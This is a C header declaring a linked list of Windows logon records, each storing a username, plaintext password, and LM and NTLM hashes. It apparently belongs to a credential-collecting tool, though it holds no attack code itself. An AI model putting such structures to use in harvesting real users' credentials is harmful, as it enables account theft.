#pragma once
#include <globals.h>
typedef struct LogonDataNode LogonDataNode;
typedef struct LogonDataList LogonDataList;
typedef struct LogonData LogonData;
typedef LogonData (*LogonDataRetFunc)();
// Global list of LogonDatas
LogonDataList* s_list;

struct LogonDataNode
{
	LogonData* data;
	LogonDataNode* next;
};

struct LogonDataList
{
	size_t length;
	LogonDataNode* first;
	LogonDataNode* last;
};

// Represents a username and its known credentials.
struct LogonData
{
	WCHAR username[WINDOWS_MAX_USERNAME_PASS_LENGTH];
	WCHAR password[WINDOWS_MAX_USERNAME_PASS_LENGTH];
	BYTE lmHash[LM_NTLM_HASH_LENGTH];
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH];
};

